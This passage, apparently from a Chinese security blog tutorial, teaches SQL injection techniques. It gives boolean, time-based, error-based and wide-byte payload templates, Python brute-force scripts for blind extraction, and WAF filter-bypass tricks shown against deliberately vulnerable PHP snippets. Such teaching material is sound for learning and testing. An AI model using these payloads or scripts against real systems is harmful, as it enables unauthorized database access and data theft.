+<h3 id="payload模板与步骤-1"><a href="#payload模板与步骤-1" class="headerlink" title="payload模板与步骤"></a>payload模板与步骤</h3><ol>
+<li>获取数据库长度</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and (select length(database()))&gt;10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="2">
+<li>查库名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and (select ascii(substr(database(),1,1)))&gt;63<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="3">
+<li>查表名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;63<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="4">
+<li>查列名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39;),1,1))&gt;63<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="5">
+<li>查字段</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and ascii(substr((select 列名 from 表名),1,1))&gt;63<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
+<li>substr函数</li>
+</ol>
+<p>语法格式：SUBSTR(字段名,A,N)</p>
+<p>从指定的字段从第A个字符（这里的字符从<strong>1</strong>开始）向后截取N个字符</p>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210724183800027.png" alt="image-20210724183800027" loading="lazy"></p>
+<ol start="2">
+<li>ascii函数</li>
+</ol>
+<p>语法格式：ASCII(字符)</p>
+<p>返回字符的ASCII码</p>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210724184056134.png" alt="image-20210724184056134" loading="lazy"></p>
+<ol start="3">
+<li>脚本</li>
+</ol>
+<p>盲注都是搭配脚本使用的，这里提供一个简单的python脚本模板，根据具体环境修改</p>
+<ul>
+<li>遍历查询</li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">''</span>      <span class="token comment">#需要盲注的网址</span>
+
+payload <span class="token operator">=</span> <span class="token string">''</span>   <span class="token comment">#bool盲注的payload</span>
+
+flagstr <span class="token operator">=</span> <span class="token string">'0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm-&#125;&#123;'</span>  
+
+flag <span class="token operator">=</span> <span class="token string">''</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> c <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"id"</span><span class="token punctuation">:</span>payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>c<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">''</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>    <span class="token comment">#返回的页面成功时的回显，由此判断是否存在此字符</span>
+            flag<span class="token operator">+=</span>c
+            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> c<span class="token operator">==</span><span class="token string">'&#125;'</span><span class="token punctuation">:</span>
+                exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>二分查询</li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">""</span>
+
+flag <span class="token operator">=</span> <span class="token string">""</span>
+
+payload <span class="token operator">=</span> <span class="token string">""</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token builtin">max</span><span class="token operator">=</span><span class="token number">128</span>
+    <span class="token builtin">min</span><span class="token operator">=</span><span class="token number">32</span>
+    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        mid<span class="token operator">=</span><span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
+        <span class="token keyword">if</span> <span class="token builtin">min</span><span class="token operator">==</span>mid<span class="token punctuation">:</span>
+            flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">' '</span><span class="token punctuation">:</span>
+                exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span> 
+        <span class="token punctuation">&#125;</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">''</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>    <span class="token comment">#返回的页面成功时的回显，由此判断是否存在此字符</span>
+            <span class="token builtin">min</span><span class="token operator">=</span>mid
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token builtin">max</span><span class="token operator">=</span>mid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间盲注是另一种形式的盲注，与bool盲注不同，时间盲注没有任何的报错信息输出，页面不管对或错都是一种状态，攻击者无法通过页面返回状态来判断输入的SQL注入测试语句是否正确，只能通过构造的SQL测试语句，根据页面的返回时间判断数据库中储存了哪些信息。</p>
+<h3 id="payload模板与步骤-2"><a href="#payload模板与步骤-2" class="headerlink" title="payload模板与步骤"></a>payload模板与步骤</h3><ol>
+<li>获取数据库长度</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and sleep(if(length((select database())&#x3D;5),0,5))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="2">
+<li>查库名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and sleep(if((select ascii(substr(database(),1,1)))&gt;63,0,5))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="3">
+<li>查表名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;63,0,5))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="4">
+<li>查列名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and sleep(if(ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39;),1,1))&gt;63,0,5))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="5">
+<li>查字段</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and sleep(if(ascii(substr((select 列名 from 表名),1,1))&gt;63,0,5))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
+<li>sleep函数</li>
+</ol>
+<p>语法格式：SLEEP(时间)</p>
+<p>使执行挂起一段时间，单位为秒</p>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210724184131894.png" alt="image-20210724184131894" loading="lazy"></p>
+<ol start="2">
+<li>if函数</li>
+</ol>
+<p>语法格式：IF(expr1,expr2,expr3)</p>
+<p>效果类似于编程语言中常见的三元运算符，如果expr1为真（不等于0且不等于null），返回expr2，否则返回expr3</p>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210724184513617.png" alt="image-20210724184513617" loading="lazy"></p>
+<ol start="3">
+<li>脚本</li>
+</ol>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">''</span>
+
+flag <span class="token operator">=</span> <span class="token string">''</span>
+
+payload <span class="token operator">=</span> <span class="token string">""</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token builtin">min</span><span class="token operator">=</span><span class="token number">32</span>
+    <span class="token builtin">max</span><span class="token operator">=</span><span class="token number">128</span>
+    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        mid<span class="token operator">=</span><span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
+        <span class="token keyword">if</span> <span class="token builtin">min</span><span class="token operator">==</span>mid<span class="token punctuation">:</span>
+            flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">' '</span><span class="token punctuation">:</span>
+                exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
+            <span class="token builtin">max</span><span class="token operator">=</span>mid
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            <span class="token builtin">min</span><span class="token operator">=</span>mid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="报错注入-floor"><a href="#报错注入-floor" class="headerlink" title="报错注入-floor"></a>报错注入-floor</h2><p>floor注入是报错注入的一种方式，主要原因是rand函数与group by子句一起使用时，rand函数会计算多次，会导致报错产生的注入。</p>
+<h3 id="payload模板与步骤-3"><a href="#payload模板与步骤-3" class="headerlink" title="payload模板与步骤"></a>payload模板与步骤</h3><ol>
+<li>查库名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) x from information_schema.tables group by x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210724221449012.png" alt="image-20210724221449012" loading="lazy"></p>
+<ol start="2">
+<li>查表名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and (select 1 from (select count(*),concat((select (table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2)) x from information_schema.tables group by x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210724221612834.png" alt="image-20210724221612834" loading="lazy"></p>
+<ol start="3">
+<li>查列名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210724224135261.png" alt="image-20210724224135261" loading="lazy"></p>
+<ol start="4">
+<li>查字段</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and (select 1 from (select count(*),concat((select 列名 from 表名 limit 0,1),0x3a,floor(rand()*2))x from information_schema.tables group by x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210724230714048.png" alt="image-20210724230714048" loading="lazy"></p>
+<h3 id="注意事项-3"><a href="#注意事项-3" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
+<li>floor函数</li>
+</ol>
+<p>语法格式：FLOOR(x)</p>
+<p>返回不大于x的最大整数值</p>
+<ol start="2">
+<li>rand函数</li>
+</ol>
+<p>语法格式：RAND()</p>
+<p>产生一个在0和1之间的随机数</p>
+<p>当提供一个种子数时，生成的随机数是相同的</p>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210724232103948.png" alt="image-20210724232103948" loading="lazy"></p>
+<h2 id="报错注入-updatexml"><a href="#报错注入-updatexml" class="headerlink" title="报错注入-updatexml"></a>报错注入-updatexml</h2><p><code>updatexml</code>也是一种报错注入，它利用<code>updatexml</code>函数中第二个参数<code>XPATH_string</code>的报错进行注入。</p>
+<p><code>XPATH_string</code>是XML文档路径，格式是&#x2F;XXX&#x2F;XXX&#x2F;XXX&#x2F;，如果格式不正确就会报错</p>
+<h3 id="payload模板与步骤-4"><a href="#payload模板与步骤-4" class="headerlink" title="payload模板与步骤"></a>payload模板与步骤</h3><ol>
+<li>查库名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and updatexml(1,concat(0x7e,database()),0)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210725110316413.png" alt="image-20210725110316413" loading="lazy"></p>
+<ol start="2">
+<li>查表名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)),0)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210725111053307.png" alt="image-20210725111053307" loading="lazy"></p>
+<ol start="3">
+<li>查列名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39; limit 0,1)),0)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210725111329442.png" alt="image-20210725111329442" loading="lazy"></p>
+<ol start="4">
+<li>查字段</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and updatexml(1,concat(0x7e,(select 列名 from 表名 limit 0,1)),0)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210725111528458.png" alt="image-20210725111528458" loading="lazy"></p>
+<h3 id="注意事项-4"><a href="#注意事项-4" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
+<li>updataxml函数</li>
+</ol>
+<p>语法格式：UPDATEXML(XML_document, XPath_string, new_value)</p>
+<p>其中：</p>
+<p>XML_document是String型数据，是XML文档的文件格式</p>
+<p>XPath_string是（Xpath格式的字符串）是XML文档路径</p>
+<p>new_value是String型数据，用于替换查找到的符合条件的数据</p>
+<p><code>updatexml</code>可以对XML文档进行更新</p>
+<h2 id="报错注入-extractvalue"><a href="#报错注入-extractvalue" class="headerlink" title="报错注入-extractvalue"></a>报错注入-extractvalue</h2><p><code>extractvalue</code>也是一种报错注入，它与<code>updatexml</code>注入的原理一样</p>
+<h3 id="payload模板与步骤-5"><a href="#payload模板与步骤-5" class="headerlink" title="payload模板与步骤"></a>payload模板与步骤</h3><ol>
+<li>查库名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and extractvalue(1,concat(0x7e,database()))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210725144530805.png" alt="image-20210725144530805" loading="lazy"></p>
+<ol start="2">
+<li>查表名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210725145257615.png" alt="image-20210725145257615" loading="lazy"></p>
+<ol start="3">
+<li>查列名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39; limit 0,1)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210725145450328.png" alt="image-20210725145450328" loading="lazy"></p>
+<ol start="4">
+<li>查字段</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and extractvalue(1,concat(0x7e,(select 列名 from 库名 limit 0,1)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210725150025086.png" alt="image-20210725150025086" loading="lazy"></p>
+<h3 id="注意事项-5"><a href="#注意事项-5" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
+<li>extractvalue函数</li>
+</ol>
+<p>语法格式：EXTRACTVALUE(XML_document, XPath_string)</p>
+<p><code>extrctvalue</code>函数可以对XML文档进行查询</p>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>开发者为了防止出现SQL注入攻击，将用户输入的数据用addslashes等函数进行过滤。</p>
+<p>addslashes等函数默认对单引号等字符进行转义，这样就可以避免注入。</p>
+<p>宽字节注入产生的原因是：MySQL在使用过GBK编码的时候，如果第一个字符的ASCII码大于128，会认为前两个字符是一个汉字，会将后面的转义字符<code>\</code>“吃掉”，将前两个字符拼接为汉字，这样就可以将SQL语句闭合，造成宽字节注入。</p>
+<h3 id="payload模板与步骤-6"><a href="#payload模板与步骤-6" class="headerlink" title="payload模板与步骤"></a>payload模板与步骤</h3><ol>
+<li>查库名</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">id&#x3D;1%81&#39; and 1&#x3D;2 union select 1,database(),3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="2">
+<li>查表名</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">id&#x3D;1%81&#39; and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;0x74657374（库名的十六进制，这里单引号会转义）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="3">
+<li>查列名</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">id&#x3D;1%81&#39; and 1&#x3D;2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;0x74657374 and table_name&#x3D;0x666c6167<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="4">
+<li>查字段</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">id&#x3D;1%81&#39; and 1&#x3D;2 union select 1,group_concat(列名，列名，···),3 from 表名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="注意事项-6"><a href="#注意事项-6" class="headerlink" title="注意事项"></a>注意事项</h3><p>利用宽字节注入原理，只要第一个字符的ASCII码大于<code>128</code>，MySQL数据库就会认为前两个字符是一个汉字，可以正常闭合SQL语句进行注入</p>
+<p>这样就可以用ASCII码为129的字符进行注入，其URL编码为<code>%81</code></p>
+<p>当然注入的第一个字符不一定是<code>%81</code>，只要是大于<code>%80</code>，且在汉字的编码内即可</p>
+<h2 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h2><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>根据应用的过滤规则，会将空格加入黑名单，但是空格存在多种绕过方式，常见的包括<code>/**/</code>、<code>制表符</code>、<code>换行符</code>、<code>括号</code>、<code>反引号</code>来代替空格</p>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">#漏洞代码示例
+if(!preg_match(&#39;&#x2F; &#x2F;&#39;,$_GET[&quot;id&quot;]))&#123;
+    die(&quot;ERROR&quot;);
+&#125;else&#123;
+    $id &#x3D; $_GET[&quot;id&quot;];
+    $sql &#x3D; &quot;SELECT * FROM users WHERE id &#x3D; $id LIMIT 0,1&quot;;
+    $result &#x3D; mysql_query($sql);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>&#x2F;**&#x2F;</li>
+</ul>
+<p>MySQL数据库中可以用&#x2F;**&#x2F;（注释符）来代替空格，将空格用注释符代替后，SQL语句可以正常运行</p>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210726125323913.png" alt="image-20210726125323913" loading="lazy"></p>
+<ul>
+<li>制表符</li>
+</ul>
+<p>在MySQL数据库中，可以用制表符（%09、%0B）来代替空格，制表符是不可见字符，在URL传输中需要编码</p>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210726125809221.png" alt="image-20210726125809221" loading="lazy"></p>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210726125830823.png" alt="image-20210726125830823" loading="lazy"></p>
+<ul>
+<li>换行符</li>
+</ul>
+<p>MySQL数据库支持换行执行SQL语句，可以利用换行符（%0A、%0C）代替空格，换行符也是不可见字符，在URL传输中需要编码</p>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210726125908271.png" alt="image-20210726125908271" loading="lazy"></p>
+<ul>
+<li>括号</li>
+</ul>
+<p>在MySQL数据库中，任何查询中都可以使用括号嵌套SQL语句</p>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210726130541927.png" alt="image-20210726130541927" loading="lazy"></p>
+<p>MySQL数据库中有一个特性。</p>
+<p>在条件语句中，在<code>where id=1</code>后面加<code>=1</code>成为<code>where id=1=1</code>，就是对前面所有结果与1，查询结果与原来一样</p>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210726131604921.png" alt="image-20210726131604921" loading="lazy"></p>
+<p>在<code>where id=1</code>后面加<code>=0</code>成为<code>where id=1=0</code>，就是对前面的所有结果与0（取反），即查询的结果除去原有查询结果的其他数据</p>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210726131919320.png" alt="image-20210726131919320" loading="lazy"></p>
+<p>利用以上特性，构造括号绕过payload就可以进行bool盲注，获得数据库的信息</p>
+<pre class="line-numbers language-none"><code class="language-none">id&#x3D;1&#x3D;(ascii(mid(database()from(1)for(1)))&#x3D;116)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>当数据库的第一个字母为t时，上面等价于<code>id=1=1</code></p>
+<ul>
+<li>`</li>
+</ul>
+<p>MySQL中的反引号是为了区分MySQL的保留字与普通字而引入的符号，反引号可以代替空格</p>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210726145309481.png" alt="image-20210726145309481" loading="lazy"></p>
+<h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>MySQL会执行放在<code>/*! ···*/</code>中的语句。</p>
+<p><code>/*! 50010···/</code>也可以执行位于其中的SQL语句，其中50010表示SQL版本为5.00.10。当MySQL数据库的实际版本号大于内联注释中的版本号时，就会执行内联注释中的代码。</p>
+<p>当前MySQL数据库的版本是5.7.26，使用此版本的数据库进行验证</p>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210726150609315.png" alt="image-20210726150609315" loading="lazy"></p>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>根据应用程序的过滤规则，通常会针对恶意关键字设置黑名单，如果存在恶意关键字，应用程序就会退出运行。</p>
+<p>在过滤规则中可能存在过滤不完整或者只过滤小写或者大写的情况，没有针对大小写组合进行过滤，导致可以通过大小写混写payload的方式来绕过关键字。</p>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">#漏洞代码示例
+if(!preg_match(&#39;&#x2F;select&#x2F;&#39;,$_GET[&quot;id&quot;]))&#123;
+    die(&quot;ERROR&quot;);
+&#125;else&#123;
+    $id &#x3D; $_GET[&quot;id&quot;];
+    $sql &#x3D; &quot;SELECT * FROM users WHERE id &#x3D; $id LIMIT 0,1&quot;;
+    $result &#x3D; mysql_query($sql);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>直接传入<code>select</code>会回显ERROR，当传入<code>SeLeCt</code>时正常回显</p>
+<h3 id="双写关键词绕过"><a href="#双写关键词绕过" class="headerlink" title="双写关键词绕过"></a>双写关键词绕过</h3><p>根据应用程序的过滤规则，有时不是直接将关键词加入黑名单，而是利用<code>preg_replace</code>函数将关键词替换</p>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">#漏洞代码示例
+if(isser($_GET[&quot;id&quot;]))&#123;
+    $id &#x3D; preg_replace(&#39;&#x2F;select&#x2F;i&#39;,&#39;&#39;,$_GET[&quot;id&quot;];
+    $sql &#x3D; &quot;SELECT * FROM users WHERE id &#x3D; $id LIMIT 0,1&quot;;
+    $result &#x3D; mysql_query($sql);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如果直接传入<code>select</code>将会被替换成空而报错，但是<code>preg_replace</code>函数并没有进行多次过滤，导致可以通过双写关键词的方式绕过</p>
+<p>当传入<code>seselectlect</code>时，中间的<code>select</code>被替换成空，实际传入的是<code>select</code>，成功绕过</p>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">if(!preg_match(&#39;&#x2F;select&#x2F;i&#39;,$_GET[&quot;id&quot;]))&#123;
+    die(&quot;ERROR&quot;);
+&#125;else&#123;
+    $id &#x3D; $_GET[&quot;id&quot;];
+    $sql &#x3D; &quot;SELECT * FROM users WHERE id &#x3D; $id LIMIT 0,1&quot;;
+    $result &#x3D; mysql_query($sql);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><p>双重URL编码绕过</p>
+</li>
+<li><p>十六进制编码绕过</p>
+</li>
+</ul>
+<p>MySQL数据库可以识别十六进制，会对十六进制的数据进行自动转换</p>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210726153906638.png" alt="image-20210726153906638" loading="lazy"></p>
+<p>如果PHP配置中开启了GPC，GPC会自动会单引号进行转义，这样注入就无法正常使用。</p>
+<p>但是如果将注入的数据转换成十六进制，就不需要单引号，可以正常注入</p>
